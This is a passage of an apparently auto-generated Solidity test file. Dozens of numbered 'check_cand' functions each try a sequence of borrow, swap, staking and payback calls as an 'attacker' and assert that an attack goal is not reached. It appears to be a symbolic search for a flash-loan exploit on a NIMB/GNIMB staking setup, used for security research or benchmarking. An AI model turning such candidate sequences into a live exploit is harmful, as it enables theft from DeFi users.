        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand810(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand811(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand812(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand813(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand814(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand815(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand816(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand817(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand818(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand819(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand820(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand821(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand822(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand823(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand824(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand825(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand826(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand827(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand828(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand829(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand830(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand831(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand832(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand833(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand834(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand835(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand836(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand837(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand838(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand839(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand840(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand841(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand842(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand843(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand844(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand845(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nbu(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand846(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nbu(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand847(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand848(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand849(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand850(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand851(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand852(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand853(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand854(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand855(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand856(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand857(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand858(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand859(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand860(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand861(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand862(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand863(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand864(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
